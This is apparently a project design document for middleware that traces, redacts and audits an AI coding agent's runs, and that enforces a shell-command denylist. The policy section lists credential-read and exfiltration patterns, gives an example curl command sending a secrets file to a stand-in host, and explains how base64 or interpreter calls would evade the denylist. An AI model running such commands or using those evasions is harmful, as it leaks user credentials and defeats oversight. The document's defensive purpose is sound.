# Glass Box: trace and audit middleware

The middleware capability this team designed on top of the Agent Launchpad
Starter Kit. Read it alongside
[ONE_PAGE_ARCHITECTURE.md](ONE_PAGE_ARCHITECTURE.md), which draws the same
design as a single page.

## The problem

The Starter Kit records the *result* of an Agent Run — a status, an output
string, an error string — and nothing about how the Run got there. Codex
reasons, executes commands, and edits files across many steps inside a
disposable container whose stdout is parsed for one final message and then
discarded. When a Run fails, the operator sees `Codex exited with code 1: boom`
and cannot answer the questions that matter:

- Which step failed, and what had the Agent already changed before it failed?
- How long did each step take, and what did the Run cost?
- Which Runtime, sandbox mode, and container engine actually executed it?
- Is there anything to hand to someone else as evidence?

This is Agent-specific. A Run is not one request; it is an autonomous,
multi-step process whose intermediate actions have real side effects on a
persistent workspace. Treating it as an opaque request/response is what makes
an Agent platform unoperable.

## The capability

Every Run emits a correlated, redacted **trace** — a tree of `TraceSpan`
records persisted beside Agents, messages, and Runs — plus a **versioned audit
bundle** that can leave the machine as evidence. Spans are written **as the Run
executes**, so the trace is readable while the Agent is still working, and each
one is drawn on a shared timeline so the shape of the Run is visible before any
number is read.

| Span | Category | Owns |
| --- | --- | --- |
| Root | `orchestration` | The whole Run: status, wall-clock duration, terminal error. |
| Process | `runtime.process` | One Runtime invocation: sandbox mode, runtime provider, container engine, token usage. |
| Event | `model.*`, `tool.call`, `runtime.warning`, `runtime.error`, `unknown.*` | One Codex item, with its redacted payload as attributes. |

### Stable identifiers

Every span stands alone: it carries the identity of what produced it, so a span
lifted out of the store is still interpretable.

| Field | Meaning |
| --- | --- |
| `traceId` | Correlates every span of one Run. Distinct from `runId` so an external tracer can join on it even if Runs are later retried or split. |
| `runId`, `id`, `parentSpanId` | Run, span, and tree position. |
| `agentId`, `agentVersion` | Which Agent, and which configuration version it executed against. `updateAgent` bumps the version only on a real change. |
| `sessionId` | The Codex thread this Run continued, correlating spans across Runs in one conversation. |
| `actorType` | `human` for the Run a person requested, `agent` for everything the Agent did beneath it, `system` for platform actions. |

The root span records `promptPreview` (redacted, first 200 characters) as well as
`promptLength`, and the process span records the model, its base URL, sandbox
mode, runtime provider, container engine, runtime image, and resource limits —
everything needed to diagnose a Run, and never the API key.

Two classification details do real work:

- **`item.started` and `item.completed` for the same item id are paired into one
  span**, so a step carries its actual duration instead of appearing twice as
  zero-width points. An item that starts and never completes becomes an explicit
  `warning` span rather than vanishing. When the Run ends, unfinished steps
  receive its end timestamp (`completionSource: run-end`); interrupted and
  failed Runs use `cancelled` and `error` respectively. This timestamp bounds
  observation, not a claim that the underlying command finished successfully.
- **Known non-fatal Runtime diagnostics are downgraded to `warning`.** The Ark
  model-metadata fallback is noisy but harmless; classifying it as an error
  would train an operator to ignore red.

## Policy enforcement

Tracing explains what happened; it does not stop anything. The Agent executes
model-authored shell commands inside a container the control plane owns, so the
control plane is the natural place to decide whether an action may proceed.

Commands are evaluated **as they are observed**, through an `onEvent` callback
on `RunnerRequest`, not after the turn ends. A denial removes the container, so
the command is stopped mid-flight rather than reported afterwards.

| Rule | Protects |
| --- | --- |
| `credential-read` | Host and user credentials (`~/.ssh`, `~/.aws`, `/etc/shadow`, `.netrc`, private keys) |
| `credential-exfiltration` | Workspace contents and credentials (`curl`/`wget` with upload flags) |
| `file-transfer-tool` | Workspace contents (`scp`, `rsync`, `nc`, `sftp`, `ftp`) |
| `host-filesystem-write` | Host filesystem (writes into `/etc`, `/usr`, `/bin`, `/var`, `/root`, `~`) |
| `destructive-root` | Host filesystem (recursive deletion of a root path) |
| `privilege-escalation` | Runtime isolation (`sudo`, `su`, `doas`) |

Every evaluated command produces a `policy.decision` span with
`actorType: system` — allow decisions included, so the trace shows the check
ran rather than leaving its absence ambiguous. A denial records the rule id and
the asset it protected, and the Run ends `failed` with
`Blocked by policy <rule>: <reason>` rather than `cancelled`, because the
platform stopped it and an operator did not.

`POLICY_ENABLED=false` disables enforcement; `POLICY_RULES` replaces the
built-in set with a JSON array of `{id, description, asset, pattern}`.

**Fetching is not sending.** The exfiltration rule matches upload flags, not
URLs, so `curl https://registry.npmjs.org/...` is ordinary work and
`curl --data @secrets.txt https://evil.test` is not.

**Rules match the command shape Codex actually emits.** Codex never emits a
bare command; every one arrives wrapped as `/usr/bin/bash -lc '<command>'`. A
rule anchored only on whitespace passes hand-written tests and is inert in
production, so the boundary includes quotes and subshell punctuation, and the
test suite pins the observed wrapper shapes.

### Relationship to Codex's own sandbox

Codex enforces its own OS-level sandbox (`--sandbox workspace-write`, Landlock
on Linux) *before* a command runs. That is the stronger control, and it is the
first line of defence: it denies pre-execution, where this policy layer can only
detect at `item.started` and terminate.

The two are complementary. Codex's sandbox decides what the filesystem allows;
this layer applies rules the operator wrote, works for actions the sandbox
permits (a `workspace-write` sandbox happily runs `rsync` or `curl --data`), and
produces the audit evidence — a `policy.decision` span naming the rule and the
protected asset — that an OS denial does not.

### Known limits of this control

- It is a **denylist over command text**, so it is evasion-resistant only
  against the obvious. Base64-encoded payloads, an interpreter invoked to do
  the same work (`python3 -c ...`), or a script written to the workspace and
  then executed would not match.
- It governs shell commands. File edits Codex performs through its own
  `file_change` items are traced but not policy-evaluated.
- Enforcement is asynchronous: `codex exec --json` is an observational stream,
  not an approval protocol, so the host cannot veto a command before it runs.
  The decision is made when the event is observed, which is when the command
  *starts*. A command that completes faster than the
  control plane reacts would finish, though the denial is still recorded and
  the Run still fails.

### The panel cannot take the app with it

React unmounts the entire tree on an unhandled render error, so a single bad
span used to blank the whole Playground — recoverable only by reloading the
page, during the demo, on the one screen the reviewer came to see. Two things
prevent that now: span identity is rendered defensively (a missing field shows
`—` rather than throwing), and both diagnostics panels are wrapped in an error
boundary that degrades to a dialog naming the failure and pointing at
`GET /api/runs/:id/trace`. The Run is unaffected either way; only its view
failed.

### Upgrading existing traces

Startup upgrades old stored spans without replacing their span IDs or parent
links. Missing identities reuse metadata already present on the same Run;
otherwise a trace ID is allocated once, `agentVersion` defaults to the legacy
baseline `1`, and the unknown session remains `null`. `legacyIdentityFields`
lists the backfilled fields, so inferred metadata is distinguishable from
recorded metadata. The Agent's current version and thread are never substituted
for a historical snapshot. Repeated restarts preserve the migrated identities.

Old unfinished spans close at their recorded Run end, not the upgrade time.
Stored trace attributes are re-sanitized, and prompt previews are rebuilt by
redacting the full prompt **before** truncation. Redaction covers sensitive
object properties and JSON-encoded tool output as well as credential patterns;
the independent verifier checks decoded values too. This is still not a general
data-loss-prevention system: unlabelled credentials of unknown shape cannot be
identified reliably.

New exports remain schema v2 and require the identity fields. The verifier also
accepts pre-identity schema v1 files already exported by an older release, while
still enforcing their tree, timing and redaction checks.

## Boundary and ownership

- **Who owns the decision.** `AgentService.executeRun` (the control plane) owns
  the trace. It persists the root span as `running` *before* the Runtime is
  invoked and closes every span in the same `store.mutate` transaction that
  transitions `AgentRun.status`. A Run can therefore never reach a terminal
  state without its trace being written, and a Run still executing is already
  observable through the API.
- **What crosses the boundary.** The `AgentRunner` interface stays thin: a
  runner returns `RunnerResult.events`, or throws a `RunnerExecutionError`
  carrying the events and partial usage it had observed. Because
  `RunCancelledError extends RunnerExecutionError`, a **cancelled** Run keeps
  its evidence too. Shaping raw events into spans lives entirely in `trace.ts`.
- **Trace ingestion never fails a Run.** Span construction is pure and
  synchronous. An unrecognized event type is stored as `unknown.<type>` rather
  than dropped or thrown.

## Span lifecycle and crash recovery

A span is written twice: open, then closed.

Cancellation is recorded as a relationship, not just a status: a closed span
carries `cancelledBy` — `operator` (someone pressed Stop), `agent-deleted`, or
`server-restart`.

| Phase | Root span | Process span | Event spans |
| --- | --- | --- | --- |
| Run accepted | `running`, `completedAt: null` | — | — |
| Runtime invoked | `running` | `running` | — |
| Terminal state | `ok` / `error` / `cancelled` | same | written from the observed events |
| Process killed mid-Run | `cancelled` on restart | `cancelled` on restart | whatever had been written |

Closing preserves span ids, so the terminal write **replaces** this Run's spans
rather than appending — appending would duplicate them.

### Live spans

An observability layer that only speaks once the subject has finished is not
much use during the minute the subject is running. Event spans are therefore
written twice over, in two regimes:

| Regime | Written by | Pairing | Authoritative |
| --- | --- | --- | --- |
| Live, during the Run | `LiveTraceWriter`, from the same `onEvent` callback policy uses | No lookahead: an `item.started` is written `running` and **closed in place** under the same span id when its `item.completed` arrives | No |
| Terminal, when the Run ends | `buildEventSpans`, over the whole event list | Full lookahead, plus the truncation notice span | Yes |

The two regimes agree because the second one *replaces* the first: the terminal
write already deleted and rewrote this Run's spans, so a live span is superseded
rather than duplicated. Three properties make that safe:

- **In-flight writes are drained before the rewrite.** `onEvent` is
  synchronous and persistence is not, so live updates are chained onto one
  queue and awaited before the terminal `store.mutate` — otherwise a late write
  would land after the rewrite and resurrect a span it had just replaced.
- **A trace that cannot be written never fails the Run it describes.** Live
  write errors are swallowed; the terminal write is the one that must land.
- **The live view is not truncated, it stops.** Past
  `TRACE_MAX_EVENT_SPANS_PER_RUN` the writer stops emitting rather than dropping
  the oldest spans out from under an operator who is watching them. The terminal
  write applies the real tail-keeping policy, notice span included.

Policy decisions are written live too — a denial is the span an operator most
needs to see at the moment it happens, not afterwards.

In the browser, **View trace** becomes **Watch trace live**: the panel re-reads
the bundle until the Run is terminal, marks itself `Live`, and keeps an open
span's bar growing between polls. Export stays disabled until the Run ends,
because a bundle of a half-finished Run is not evidence of anything.

![Run trace during execution, marked Live, with two running spans and a step still in progress](assets/trace-live.png)

On startup `initialize()` force-cancels orphaned Runs **and** closes every span
still marked `running`, stamping `"Server restarted while this run was active"`
with a computed duration. Without that, an interrupted Run would either carry no
trace at all or leave spans open forever — the single failure an observability
capability most needs to explain.

## Reading the trace: timeline, cost, and comparison

Three readings sit on top of the same span data, and none of them add a
capability the middleware did not already record.

**A proportional timeline.** Every span row carries a bar on one shared axis
spanning the Run's whole wall clock. Because the tree indents rows from the
left, their right edges stay aligned and a bar means the same thing at every
depth. Reading a column of durations tells you which step was slowest; the bars
also tell you *when* — the gap before a step, the step that ran while another
was still open, the failure that arrived at the very end. An open span is drawn
up to the present moment and keeps growing while the Run is live.

**An estimated cost.** Token counts answer "how much did this consume"; they do
not answer "what did it cost". The audit bundle prices the reported usage at
the rates the deployment was configured with:

| Variable | Default | Meaning |
| --- | --- | --- |
| `TRACE_COST_INPUT_PER_MTOK` | `0` | Price per million uncached input tokens |
| `TRACE_COST_CACHED_INPUT_PER_MTOK` | `0` | Price per million cached input tokens |
| `TRACE_COST_OUTPUT_PER_MTOK` | `0` | Price per million output tokens |
| `TRACE_COST_CURRENCY` | `USD` | Label only; no conversion is performed |

Cached input tokens are reported by Codex as a *subset* of input tokens, so
they are billed once at the cached rate and subtracted from the uncached half —
pricing both at the full rate would overstate every cached Run. The rates
travel inside `summary.cost` next to the estimate, so a reader can check the
arithmetic instead of trusting it. **The defaults are zero on purpose:** this
platform cannot know what an endpoint costs, and `summary.cost` is `null` for
an unpriced deployment rather than a confident `$0.00`. The estimate is an
estimate, not an invoice.

The rates are ordinary environment variables, so where you set them depends on
how the control plane was started — `.env` is read by the Docker Compose and
deployment paths, while `npm run poc` takes its configuration from the
environment it is invoked with:

```bash
ARK_API_KEY=your-key ARK_MODEL=ep-your-endpoint \
TRACE_COST_INPUT_PER_MTOK=0.14 \
TRACE_COST_CACHED_INPUT_PER_MTOK=0.014 \
TRACE_COST_OUTPUT_PER_MTOK=0.28 \
npm run poc
```

**A two-Run comparison.** A single trace says what happened; after a retry, a
prompt edit, or a configuration change the question is what *changed*. Run
history selects any two Runs of an Agent and puts their summaries side by side —
duration, tokens, cost, tool calls, model turns, policy denials, warnings,
errors, spans — with a delta column that colours the direction only for metrics
where lower is unambiguously better.

![Two runs of the seeded Agent compared side by side, with a delta column](assets/run-compare.png)

## Redaction and trust boundary

`redactSecrets` runs before anything is written to disk. It strips, in order:

1. every configured secret (the Ark API key) by exact match;
2. credential *shapes* the process was never told about — `Bearer` and `Basic`
   authorization headers, `sk-`, `ghp_`/`gho_`/`ghs_`/`github_pat_`, `xoxb-`,
   `AIza`, AWS `AKIA`/`ASIA` key ids, PEM private-key blocks including their
   body, and the value of any `*password`/`*secret`/`*api_key`/`*token`
   assignment (the name is kept, the value is not);
3. anything left over the length budget.

Step 2 matters because the Agent can *discover* a credential inside its own
workspace and echo it to stdout, where exact-match redaction against the Ark key
would never see it — and the audit bundle is built to be shared, so a miss there
is a disclosure rather than a local blemish.

Redaction is applied to every span attribute (recursively through nested objects
and arrays), every span error message, and `AgentRun.error` /
`Agent.lastError`, which surface in the UI and API.

The Ark key reaches the Runtime only as an environment variable
(`childEnvironment()` in both runners) and is never part of a Codex JSON event,
so string-match redaction is defence in depth rather than the only control.
`GET /api/runs/:id/trace` and `GET /api/runs/:id/audit` sit behind the same
bearer-auth hook as every other `/api/*` route, and the export path re-applies
redaction at serialization time because a bundle is meant to leave the machine.

## Verifying the evidence

An export nobody checks is a file, not evidence. `scripts/verify-audit.mjs`
reads an exported bundle and answers whether it is worth handing to someone who
was not there:

| Check | Why it matters |
| --- | --- |
| `schemaVersion` is one this verifier understands | A consumer should refuse a shape it cannot read rather than guess. |
| Every span carries `id`, `traceId`, `runId`, `agentId`, `agentVersion`, `actorType`, `category`, `status`, `startedAt` | A span that is missing identity cannot be interpreted on its own, which is the whole point of the field set. |
| One traceId, no duplicate span ids, every `parentSpanId` resolves, exactly one root, no cycles | A tree with an orphan is a trace with a hole in the middle of the story. |
| `durationMs` agrees with the timestamps; nothing completed before it started | A duration nobody can recompute is a number, not a measurement. |
| No span left `running` on a terminal Run | Exactly what the crash-recovery path exists to prevent, checked from outside. |
| No credential-shaped string anywhere in the file | The bundle is built to leave the machine. |

```bash
npm run verify:audit -- ~/Downloads/agentlens-run-<id>-audit.json
npm run verify:evidence   # seed, serve, export over HTTP, verify, and check the route is guarded
```

The verifier restates the credential patterns **independently** of
`trace.ts` rather than importing them. A checker that shares code with the
producer cannot catch a bug in the shared code, and the job of this one is to
disbelieve the producer.

`npm run verify:evidence` is the end-to-end version: it seeds a throwaway
store, serves it, exports every bundle over the real authenticated route,
verifies each, then restarts with `APP_AUTH_TOKEN` set and confirms an
unauthenticated export is refused with a 401. Both run in CI on every push.

## Retention

Traces are bounded on two axes so one Agent cannot exhaust the JSON store, which
rewrites the whole file on every mutation:

| Control | Default | Behaviour |
| --- | --- | --- |
| `TRACE_MAX_EVENT_SPANS_PER_RUN` | 500 | Keeps the most recent events for a Run — a failing step is normally at the tail — and records the dropped count in a `trace.truncated` warning span. |
| `TRACE_RETENTION_RUNS` | 200 | Keeps the newest N Runs, discarding older Runs **whole**, so a retained trace is never left with half its tree missing. |

Deleting an Agent deletes its spans along with its Runs and messages, matching
the existing workspace-archival policy.

## Seeded demo data

`npm run demo:seed` writes a fixture Agent with two complete traces into the
configured `APP_DATA_DIR`, so a reviewer can inspect the middleware without a
BytePlus ModelArk key. It refuses to overwrite a store that already holds Agents
unless `--force` is passed.

```bash
npm run demo:seed              # seed the default .data/ store
npm run demo:seed -- --force   # replace an existing store
```

The fixture is built to exercise every classification path: a successful Run
(reasoning, file writes, a passing command, an allow decision, a completed model
turn) and a failing Run (a started-but-never-completed turn, a file write, an
allow decision, a failing command, the benign model-metadata diagnostic
downgraded to `warning`, and the `runtime.error` that ended it). Every filter in
the trace view is non-empty, the stat cards are populated, and one span carries
planted secrets already stored as `[REDACTED]`.

Fixture spans carry the **same identity fields a real span carries** —
`traceId`, `agentVersion`, `sessionId`, `actorType` — and both Runs share one
`sessionId`, so the thread correlation is visible in the fixture too. This is
not cosmetic: a fixture whose spans are shaped differently from real ones is a
fixture of nothing, and it is exactly the kind of gap that passes every backend
test and then fails in front of a reviewer. `npm run verify:evidence` exports
the seeded Runs over HTTP and verifies them on every push for that reason.

## Demo script (three minutes)

The failure case below is deliberately an **Agent-caused failure**, not a
platform misconfiguration. Breaking `ARK_MODEL` would fail the Run before the
Agent does any work, producing a two-span trace that demonstrates nothing. The
point of this middleware is finding a failing step *among real work*, so the
demo has to produce real work first.

**Without Ark credentials?** Run `npm run demo:seed`, start the server, and
steps 3, 5, 6 and 8 all work against the fixture.

1. **Baseline.** `npm run poc`, open <http://localhost:3000>, create an Agent,
   and show its `ready` lifecycle state.
2. **Normal case.** Send `Create a TypeScript hello-world CLI, add a test, and
   run it.` A real model call, real file writes, and a real command execution
   inside the disposable container.
3. **Watch it happen.** While the Run is still going, select **Watch trace
   live**. Steps appear as the Agent takes them, the open step's bar grows
   against the timeline, and the panel is marked `Live`. This is the difference
   between an observability layer and a post-mortem.
4. **Evidence.** When it finishes, walk the tree: root → process → individual
   `tool.call` and `model.message` spans, each with its real duration and its
   bar on one shared axis, so the slowest step is visible without reading a
   number. Read the stat cards — duration, tokens in/out/cached, estimated
   cost, tool calls and model turns, warnings and errors. Expand a `tool.call`
   to show the redacted payload. Use the count-badged filters to isolate `tool`
   or `model` spans; note the tree stays connected because filtering keeps
   ancestors.
5. **Failure case.** Send `Add a second test that asserts 1 === 2 so the suite
   fails, then run the whole suite and report the result.` The Agent reasons,
   edits a file, runs the suite, and the command exits non-zero — a Run that
   fails *after* doing real work.
6. **Locate the failing step.** Open the trace and filter to **error**. The
   failing step is isolated out of a dozen successful ones, carrying its
   redacted stderr, while the preceding `file_change` spans still show exactly
   what the Agent changed before it broke.
7. **Compare the two Runs.** Open **Runs**, tick both, and press **Compare
   runs**: the failing Run against the successful one, with the deltas in
   duration, tokens, cost, and errors.
8. **Export the evidence.** Press **Export JSON** to download the audit bundle:
   `schemaVersion`, the redacted Run, the summary including its cost estimate
   and the rates behind it, and every span. Open it and point out that secrets
   are `[REDACTED]` in the file itself.
9. **Check the evidence, don't just wave it.** Run
   `npm run verify:audit -- <the file you just downloaded>`. It re-derives the
   tree, the timings, and the redaction from the file itself and prints what it
   found. This is the difference between exporting JSON and producing evidence.
10. **Recovery case.** Start another task, and while it is running kill the
   server (`Ctrl+C`) and restart it. The Run is reconciled to `cancelled` and
   its spans are closed with `"Server restarted while this run was active"` —
   an interrupted Run still has a readable trace instead of nothing.
11. **Still controllable.** Open **Runs**, filter by `failed`, sort by duration
    or tokens, and confirm the Agent returns to `ready` and accepts a new task.

If short on time, cut steps 7 and 9 — but step 10 is the strongest recovery
evidence in the submission.

## Automated evidence

`npm run check` runs all of it.

| Behaviour | Test |
| --- | --- |
| Correlated trace for a successful Run | `agent-service.test.ts` — "records a correlated, successful trace for a completed run" |
| The failing step is identifiable | `agent-service.test.ts` — "identifies the failing step when a run fails" |
| A Run in flight already has a trace | `agent-service.test.ts` — "exposes an open trace before the Runtime returns" |
| A step is readable while it is still running | `agent-service.test.ts` — "exposes a running step before the Runtime returns" |
| A live span is closed in place, not duplicated | `trace.test.ts` — "opens a span when a step starts and closes the same span when it ends"; `agent-service.test.ts` (same test as above) |
| A completion whose start was missed still lands | `trace.test.ts` — "emits a point span for a completion whose start was never seen" |
| The live cap stops emitting but still closes open spans | `trace.test.ts` — "stops emitting past the per-Run cap but still closes what it opened" |
| Cached input tokens are priced once | `audit.test.ts` — "prices the cached input tokens once, at the cached rate" |
| An unpriced deployment reports no cost | `audit.test.ts` — "reports no cost at all when no price is configured" |
| A crash leaves no span stuck open | `agent-service.test.ts` — "closes spans left open by a crash when the server restarts" |
| Spans are deleted with their Agent | `agent-service.test.ts` — "removes an Agent's spans when the Agent is deleted" |
| Old Runs are pruned whole | `agent-service.test.ts` — "retains only the most recent Runs' spans"; `trace.test.ts` — `pruneSpans` |
| Per-Run event cap and its notice span | `trace.test.ts` — "event span capping" |
| started/completed pairing and durations | `trace.test.ts` — "pairs item lifecycle events and computes their duration" |
| An item that never completes is a warning | `trace.test.ts` — "marks an item with no completion event as a warning" |
| Benign diagnostics are not errors | `trace.test.ts` — "downgrades the known model metadata fallback event to a warning" |
| Redaction across nested payloads and batches | `trace.test.ts` — `redactSecrets`, `redactAttributes`, "never leaks a planted secret" |
| Unconfigured credential shapes are redacted | `trace.test.ts` — "credential pattern redaction" |
| Redaction does not disturb warning classification | `trace.test.ts` — "still lets the known model metadata fallback message through" |
| Export re-redacts and summarizes | `audit.test.ts` — "summarizes a run and redacts secrets again before export" |
| Policy denies credential reads, exfiltration, escalation | `policy.test.ts` — "policy evaluation" |
| Ordinary development commands are allowed | `policy.test.ts` — "allows ordinary development work" |
| Rules match the real `bash -lc` wrapper | `policy.test.ts` — "real Codex command shapes" |
| A denied Run is terminated at the Runtime boundary | `agent-service.test.ts` — "terminates a Run at the Runtime boundary when policy denies an action" |
| Allow decisions are recorded too | `agent-service.test.ts` — "records an allow decision so the check is visible" |
| The Agent recovers after a denial | `agent-service.test.ts` — "leaves the Agent usable after a policy denial" |
| API routes require the shared token | `app.test.ts` — "protects API routes with the configured shared token" |
| One shared identity across a Run's spans | `agent-service.test.ts` — "stamps every span of a Run with one shared identity" |
| Model and infrastructure metadata recorded | `agent-service.test.ts` — "records the model and infrastructure needed to diagnose a Run" |
| Prompt preview is redacted | `agent-service.test.ts` — "keeps a redacted prompt preview on the root span" |
| Session id correlates Runs in a thread | `agent-service.test.ts` — "carries the Codex session id so Runs in one thread correlate" |
| Agent version bumps only on real change | `agent-service.test.ts` — "bumps the Agent version only on a real configuration change" |
| Cancellation records its cause | `agent-service.test.ts` — "records what cancelled a Run rather than only that it was cancelled" |
| Filtering keeps a tree connected, and cannot hang on a cycle | `trace-view.test.ts` — "keeps every ancestor so the filtered tree is still connected", "terminates on a parent cycle rather than hanging the panel" |
| Timeline geometry: shared axis, open spans, zero-width Runs | `trace-view.test.ts` — "timeline geometry" |
| A span written without identity renders instead of crashing | `trace-view.test.ts` — "survives a span written without one" |
| A sub-cent Run does not round away to zero | `trace-view.test.ts` — "keeps a sub-cent Run from rounding away to zero" |
| An exported bundle is well formed, connected, and redacted | `scripts/verify-audit.mjs`, run over every seeded Run by `npm run verify:evidence` |
| The export route refuses an unauthenticated caller | `npm run verify:evidence`, against a server started with `APP_AUTH_TOKEN` |

## Limitations

- **The live view polls; it is not pushed.** The panel re-reads the audit
  bundle roughly once a second while the Run is active, so a step can be up to
  a second old on screen and every poll re-serialises the whole Run. Server-sent
  events or a WebSocket would remove both costs; polling was chosen because it
  reuses the existing authenticated route and adds no new transport to the
  trust boundary.
- **The timeline is a bar per span, not a flame graph.** Concurrency is visible
  as overlapping bars but is not laid out in tracks, and there is no zoom or
  brush: on a Run with hundreds of spans the axis is compressed and short steps
  all render at the 1.2% minimum width.
- **The cost estimate is only as good as its configured rates.** Nothing
  validates them against a price list, and cached-token accounting follows what
  Codex reports rather than what the provider bills. A Run that has reported no
  usage — one still executing, or one whose Runtime never reported any — is
  unpriced rather than free.
- **Redaction is pattern-matching.** It covers configured secrets plus the
  credential shapes listed above. A secret in a shape not on that list, or one
  that is base64- or hex-encoded before being printed, would still not be
  recognised. Pattern coverage is a moving target, not a guarantee.
- **No retry relationships, and no resource-consumption signals.** The platform
  does not retry Runs, so there is nothing to link — comparison is a manual
  choice of two Runs, not an automatic before/after. Container CPU and memory
  are recorded as configured *limits* rather than measured consumption, which
  would need instrumentation inside the Runtime.
- **Span categories cover what this platform does.** `orchestration`,
  `model.*`, `tool.call`, `runtime.*`, `policy.decision`. There is no
  memory-access, human-approval, or cloud-operation category yet; those
  capabilities are not built, and an empty category would be worse than an
  absent one.
- **Payloads are stored verbatim.** Span attributes hold the whole raw Codex
  event, so a `file_change` item can carry substantial file content into the
  store and the export. There is no capture-level control to summarise them.
- **Event timestamps are observation times.** `observedAt` is when the control
  plane read the JSON line, not when Codex emitted it, so durations carry the
  control plane's scheduling jitter. Item types Codex reports only on completion
  have no `started` event to pair with and remain zero-width points.
- **Single-process JSON store.** Inherited from the Starter Kit. A real
  deployment would send spans to an OTLP collector; the span shape (id, parent,
  category, status, timings, attributes) maps onto OpenTelemetry deliberately,
  but no exporter is implemented.
- **No trace-level access control.** The POC is single-user; trace and audit
  access use the same shared bearer token as the rest of the API. Per-principal
  authorization belongs with an identity capability, which this team did not
  build.
- **The seeded fixture is static.** `npm run demo:seed` makes the middleware
  inspectable without credentials, but its Runs are fixtures: they exercise the
  trace, classification, summary, and export paths, not the Runtime.
